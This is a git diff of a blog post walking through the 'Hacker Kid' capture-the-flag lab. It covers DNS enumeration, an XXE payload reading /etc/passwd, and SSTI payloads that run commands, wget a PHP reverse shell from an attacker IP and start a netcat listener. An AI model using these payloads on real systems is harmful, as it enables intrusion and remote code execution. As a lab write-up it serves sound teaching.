@@ -1,5 +1,5 @@
 ---
-published: false
+published: true
 layout: post
 author: mark
 date: '2021-09-21 00:00:01 UTC'
@@ -56,7 +56,7 @@ Interestingly we have a website on port 9999 with a Please Log In banner.
 
 Starting with the site on port 80 though we see there are a lot of hints to the DNS tool DIG The fact that we also have DNS running on the target gives us a good indicator that we should go take a poke at port 53:
 
-IMAGE1
+![image1.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE1.png)
 
 Before we go look at DNS, we shall run our usual gobuster enumeration to gather intel.
 
@@ -110,7 +110,7 @@ Nothing that looks too out of place or worthy of chasing just yet.
 
 Back on the webpage lets take a look at the source code.
 
-IMAGE2
+![image2.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE2.png)
 
 It mentions using a GET parameter to navigate through the pages.
 Lets create a massive list of potential page numbers and run it through wfuzz:
@@ -143,7 +143,7 @@ Requests/sec.: 911.3057
 And we get back a hit on page_no=21. Lets browse to it and check it out.
 It looks like there is some extra text at the bottom of the page.
 
-IMAGE3
+![image3.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE3.png)
 
 There have been a lot of hints to look at [DIG](https://linux.die.net/man/1/dig) so let’s go ahead and do that.
 
@@ -230,13 +230,13 @@ We get a bunch of domains here. Some web servers are set up to route to differen
 
 Looks like hackers.blackhat.local brings up the website we view at the moment, but hackerkid.blackhat.local brings up a new website.
 
-IMAGE4
+![image4.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE4.png)
 
 When we try to create a new account, our request fails, but looking at the proxy, the POST body is all XML.. perhaps we can try some XXE.
 
 In the websites code, we see how the POST request is being made.
 
-IMAGE5
+![image5.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE5.png)
 
 For our XXE to work, we want it to replace a field that we will have visibility of in the response. Lucky for us this application displays the email field back to us. How convenient!
 
@@ -257,11 +257,11 @@ XML External Entities allow us to grab external files or objects and include the
 
 Send a POST request to repeater, and test it out as normal.
 
-IMAGE6
+![image6.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE6.png)
 
 Next we attempt our XXE POC:
 
-IMAGE7
+![image7.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE7.png)
 
 Success! Now to do something juicy with it, lets try to include the /etc/passwd file.
 
@@ -271,7 +271,7 @@ Instead of replace we are going to use the SYSTEM attribute to include a file fr
 <!ENTITY example SYSTEM "file:///etc/passwd">
 ```
 
-IMAGE8
+![image8.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE8.png)
 
 Another success!
 
@@ -303,7 +303,7 @@ So we went fuck it and took a linux LFI cheatsheet list from [github](https://gi
 
 We have the .bashrc file in sakets home directory.
 
-IMAGE9
+![image9.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE9.png)
 
 Which has some a password for us (to tie to the user we are looking at)
 
@@ -314,7 +314,7 @@ password: Saket!#$%@!!
 
 And another interesting result was `/opt/server.py` We found this by guessing that the user would have installed optional apps to `/opt/` and then the information on how tornado server is setup. And tbh a bit of luck which is always nice :)
 
-IMAGE10
+![image10.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE10.png)
 
 Lets try them on that site that requires auth on port 9999
 ```
@@ -323,25 +323,25 @@ http://hackerkid.blackhat.local:9999
 
 The logon had a query string parameter ?next which doesn’t appear to do much, but after logging in the application asks us for a name.
 
-IMAGE11
+![image11.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE11.png)
 
-So lets give it a name as a query parameter. And it just responds back with whatever we put in.
+So lets pass it a name as a query parameter. And it just responds back with whatever we put in.
 
 ```
 http://hackerkid.blackhat.local:9999/?name=thoseguys
 ```
 
-IMAGE12
+![image12.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE12.png)
 
 Lets see what we can do with this one.
 
 We notice that it is vulnerable to SSTI using this.
-
+{% raw %}
 ```
-http://hackerkid.blackhat.local:9999?name={\%import%20os%}{{os.popen(%22whoami%22).read()}}
+http://hackerkid.blackhat.local:9999?name={%import%20os%}{{os.popen(%22whoami%22).read()}}
 ```
-
-IMAGE13
+{% endraw %}
+![image13.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE13.png)
 
 This gives us back saket which is the user we noted in the passwd file.
 
@@ -352,11 +352,11 @@ python3 -m http.server 8000
 ```
 
 Then use our SSTI to run wget and download it.
-
+{% raw %}
 ```
-http://hackerkid.blackhat.local:9999/?name={\%import%20os%}{{os.popen(%22wget%20http://192.168.1.162:8000/rev.php%20-O%20/tmp/rev.php%22).read()}}
+http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20http://192.168.1.162:8000/rev.php%20-O%20/tmp/rev.php%22).read()}}
 ```
-
+{% endraw %}
 Lets set up our listener with netcat.
 
 ```
@@ -364,12 +364,12 @@ nc -nlvp 443
 ```
 
 and now simply run that rev.php file directly using the php cli.
-
+{% raw %}
 ```
-http://hackerkid.blackhat.local:9999/?name={\%import%20os%}{{os.system(%22php%20/tmp/rev.php%22)}}
+http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.system(%22php%20/tmp/rev.php%22)}}
 ```
-
-IMAGE14
+{% endraw %}
+![image14.png]({{site.baseurl}}/Images/vb-hackerkid/IMAGE14.png)
 
 And that looks like a shell.
 
